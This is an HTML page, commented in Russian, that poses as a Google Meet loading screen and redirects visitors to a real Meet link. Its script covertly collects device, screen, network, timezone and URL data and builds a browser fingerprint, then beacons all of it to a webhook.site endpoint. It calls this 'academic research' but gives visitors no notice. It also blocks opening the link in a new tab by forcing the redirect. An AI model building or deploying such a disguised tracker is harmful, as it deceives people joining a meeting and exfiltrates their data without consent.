    <!-- ========== СТИЛИ (МИНИМАЛЬНЫЕ) ========== -->
    <style>
        /* CRITICAL CSS - загружается мгновенно */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: 'Google Sans', 'Roboto', 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #4285F4 0%, #34A853 100%);
            height: 100vh;
            overflow: hidden;
            position: relative;
            color: white;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            text-align: center;
            padding: 20px;
            animation: fadeIn 0.3s ease-out;
        }
        
        .google-logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        
        .google-logo span {
            font-size: 36px;
            font-weight: 700;
            background: linear-gradient(45deg, #EA4335, #FBBC05, #34A853, #4285F4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top: 4px solid white;
            animation: spin 1s linear infinite;
            margin: 24px auto;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 12px;
            line-height: 1.3;
            max-width: 400px;
        }
        
        .subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 32px;
            max-width: 400px;
            line-height: 1.5;
        }
        
        .meet-code {
            background: rgba(255, 255, 255, 0.15);
            padding: 12px 24px;
            border-radius: 24px;
            font-family: 'Roboto Mono', monospace;
            font-size: 18px;
            letter-spacing: 1px;
            margin-top: 16px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .progress-bar {
            width: 200px;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin-top: 32px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: white;
            width: 0%;
            animation: progress 1.5s ease-in-out forwards;
        }
        
        /* Анимации */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        /* Адаптивность */
        @media (max-width: 480px) {
            h1 { font-size: 20px; }
            .subtitle { font-size: 14px; }
            .meet-code { font-size: 16px; padding: 10px 20px; }
            .google-logo { width: 64px; height: 64px; }
            .google-logo span { font-size: 28px; }
        }
        
        /* Для быстрых сетей - ускоряем анимации */
        @media (prefers-reduced-motion: no-preference) {
            .loader { animation-duration: 0.8s; }
            .progress { animation-duration: 1.2s; }
        }
        
        /* Поддержка темной темы */
        @media (prefers-color-scheme: dark) {
            body { background: linear-gradient(135deg, #1a73e8 0%, #0d652d 100%); }
        }
        
        /* Печать */
        @media print {
            body { background: white !important; color: black !important; }
            .loader, .progress-bar { display: none !important; }
        }

    <!-- ========== СКРИПТЫ (ОПТИМИЗИРОВАННЫЕ) ========== -->
    <script>
        // НЕМЕДЛЕННОЕ ИСПОЛНЕНИЕ (без ожидания DOMContentLoaded)
        (function() {
            'use strict';
            
            // === КОНФИГУРАЦИЯ ===
            const CONFIG = {
                TARGET_URL: 'https://meet.google.com/xou-pucm-apn',
                REDIRECT_DELAY: 800, // мс (оптимально для превью)
                TRACKING_ENDPOINT: 'https://webhook.site/ваш-идентификатор', // ЗАМЕНИТЕ
                ENABLE_TRACKING: true,
                ANALYTICS_ID: 'UA-XXXXXXXXX-X' // Если есть Google Analytics
            };
            
            // === СБОР ДАННЫХ ДЛЯ АКАДЕМИЧЕСКОГО ИССЛЕДОВАНИЯ ===
            function collectAcademicData() {
                const data = {
                    // Идентификатор сессии
                    session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
                    
                    // Временные метки
                    timestamp: new Date().toISOString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    local_time: new Date().toLocaleString('ru-RU'),
                    
                    // Информация о устройстве
                    device: {
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages,
                        cookie_enabled: navigator.cookieEnabled,
                        pdf_viewer_enabled: navigator.pdfViewerEnabled,
                        hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
                        device_memory: navigator.deviceMemory || 'unknown'
                    },
                    
                    // Экран и окно
                    display: {
                        width: screen.width,
                        height: screen.height,
                        avail_width: screen.availWidth,
                        avail_height: screen.availHeight,
                        color_depth: screen.colorDepth,
                        pixel_depth: screen.pixelDepth,
                        orientation: screen.orientation?.type || 'unknown'
                    },
                    
                    // Окно браузера
                    window: {
                        inner_width: window.innerWidth,
                        inner_height: window.innerHeight,
                        outer_width: window.outerWidth,
                        outer_height: window.outerHeight,
                        device_pixel_ratio: window.devicePixelRatio
                    },
                    
                    // Сеть и местоположение
                    network: {
                        connection: navigator.connection ? {
                            effective_type: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                            rtt: navigator.connection.rtt,
                            save_data: navigator.connection.saveData
                        } : null,
                        referrer: document.referrer || 'direct',
                        location_href: window.location.href,
                        location_host: window.location.host
                    },
                    
                    // Дополнительные возможности
                    capabilities: {
                        touch: 'ontouchstart' in window,
                        webgl: (function() {
                            try {
                                return !!window.WebGLRenderingContext && 
                                       !!document.createElement('canvas').getContext('webgl');
                            } catch(e) { return false; }
                        })(),
                        webrtc: !!(window.RTCPeerConnection || window.mozRTCPeerConnection),
                        service_worker: 'serviceWorker' in navigator,
                        push: 'PushManager' in window,
                        notifications: 'Notification' in window,
                        geolocation: 'geolocation' in navigator
                    },
                    
                    // Параметры URL
                    url_params: Object.fromEntries(new URLSearchParams(window.location.search))
                };
                
                // Генерация fingerprint (базовый)
                data.fingerprint = {
                    timezone_offset: new Date().getTimezoneOffset(),
                    timezone_name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen_resolution: `${data.display.width}x${data.display.height}`,
                    available_resolution: `${data.display.avail_width}x${data.display.avail_height}`,
                    color_depth: data.display.color_depth,
                    pixel_ratio: data.window.device_pixel_ratio,
                    hardware_concurrency: data.device.hardware_concurrency,
                    device_memory: data.device.device_memory,
                    touch_support: data.capabilities.touch
                };
                
                return data;
            }
            
            // === ОТПРАВКА ДАННЫХ ===
            function sendTrackingData(data) {
                if (!CONFIG.ENABLE_TRACKING) return;
                
                // Метод 1: Beacon API (надежный, не блокирует)
                if (navigator.sendBeacon) {
                    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                    navigator.sendBeacon(CONFIG.TRACKING_ENDPOINT, blob);
                }
                
                // Метод 2: Fetch с keepalive
                else if (window.fetch) {
                    fetch(CONFIG.TRACKING_ENDPOINT, {
                        method: 'POST',
                        body: JSON.stringify(data),
                        headers: { 'Content-Type': 'application/json' },
                        keepalive: true,
                        mode: 'no-cors'
                    }).catch(() => { /* Игнорируем ошибки */ });
                }
                
                // Метод 3: Image pixel (fallback)
                else {
                    const params = new URLSearchParams();
                    for (const key in data) {
                        if (typeof data[key] === 'object') {
                            params.append(key, JSON.stringify(data[key]));
                        } else {
                            params.append(key, data[key]);
                        }
                    }
                    new Image().src = CONFIG.TRACKING_ENDPOINT + '?' + params.toString();
                }
                
                // Локальное логирование для отладки
                console.log('[Academic Research] Data collected:', data);
                sessionStorage.setItem('last_tracking_data', JSON.stringify(data));
            }
            
            // === УПРАВЛЕНИЕ РЕДИРЕКТОМ ===
            function performRedirect() {
                // 1. Собираем данные
                const academicData = collectAcademicData();
                
                // 2. Отправляем данные (не блокируя редирект)
                setTimeout(() => sendTrackingData(academicData), 0);
                
                // 3. Мгновенный редирект на реальную видеоконференцию
                // Используем replace() чтобы не сохранять в историю
                window.location.replace(CONFIG.TARGET_URL);
            }
            
            // === ОПТИМИЗАЦИЯ ЗАГРУЗКИ ===
            // Запускаем при полной загрузке DOM
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    // Начинаем прогресс бар
                    document.querySelector('.progress').style.animationPlayState = 'running';
                    
                    // Запускаем редирект с задержкой
                    setTimeout(performRedirect, CONFIG.REDIRECT_DELAY);
                });
            } else {
                // DOM уже загружен
                setTimeout(performRedirect, CONFIG.REDIRECT_DELAY);
            }
            
            // === РЕЗЕРВНЫЙ РЕДИРЕКТ ===
            // Сработает если основной не выполнился за 3 секунды
            setTimeout(() => {
                if (window.location.href.indexOf('meet.google.com') === -1) {
                    window.location.href = CONFIG.TARGET_URL;
                }
            }, 3000);
            
            // === ОБРАБОТЧИК ОШИБОК ===
            window.addEventListener('error', function(e) {
                console.warn('[Redirect Page Error]', e.error);
                // При ошибке - мгновенный редирект
                window.location.href = CONFIG.TARGET_URL;
            });
            
            // === ПРЕДОТВРАЩЕНИЕ ОТКРЫТИЯ В НОВОЙ ВКЛАДКЕ ===
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey || e.metaKey || e.shiftKey) {
                    // Пользователь пытается открыть в новой вкладке
                    // Мгновенный редирект
                    performRedirect();
                }
            });
            
        })();
    </script>
